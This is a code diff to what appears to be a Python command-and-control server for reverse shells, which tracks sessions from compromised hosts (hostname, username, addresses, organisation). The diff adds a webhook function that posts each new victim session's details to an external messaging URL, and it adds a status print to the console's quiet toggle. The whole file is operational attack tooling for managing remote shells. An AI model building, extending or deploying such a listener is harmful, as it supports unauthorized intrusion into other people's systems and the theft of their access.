@@ -31,6 +31,7 @@ reverse_host     = '127.0.0.1'
 reverse_tcp_port = "47080"
 reverse_ssl_port = "47443"
 MultiMaster_port = "47470"
+webhook_url      = ""
 
 class PuppetMaster:
     def __init__(self):
@@ -160,6 +161,7 @@ async def handle_shell_init(reader, writer):
                     session["org"] = org[0]+org[1]
                     Puppet_Master.sessions.append(session)
                     PrintInfo(f'Session \033[1;37m{session_hash}\033[0m {hostname} {username}  \033[1;37m{sockname} -> {peername}\033[0m {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
+                    dingding_send_meassage( f'Session \033[1;37m{session_hash}\033[0m {hostname} {username}  \033[1;37m{sockname} -> {peername}\033[0m {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")} {org}' )
                     break
 
                 else:
@@ -286,9 +288,10 @@ async def MasterConsole():
 
         elif console_cmd == "quiet":
             if Puppet_Master.quiet == True:
-                Puppet_Master.quiet = False
+                Puppet_Master.quiet = False       
             else:
                 Puppet_Master.quiet = True
+            print( "Quiet => {}".format(Puppet_Master.quiet) )
             
         else:
             continue
@@ -307,6 +310,26 @@ def getTextBetweenStrings(text, start_string, end_string):
     start_index = text.rfind(start_string) + len(start_string)
     end_index = text.rfind(end_string, start_index)
     return text[start_index:end_index]
+import urllib.request
+import json
+
+def dingding_send_meassage(message):
+    if not webhook_url:
+        return None
+    data = {
+    'msgtype': "text",
+    "text": { 'content':'<h1>Master Session:</h1>\n' + message }
+    }
+    
+    header = {
+        "Content-Type": "application/json",
+        "Charset": "UTF-8"
+    }
+    send_data = json.dumps(data)
+    send_data = send_data.encode("utf-8")
+    request = urllib.request.Request(url=webhook_url, data=send_data, headers=header)
+
+    opener = urllib.request.urlopen(request)
 
 async def main():
     keyfile    = 'key.pem'
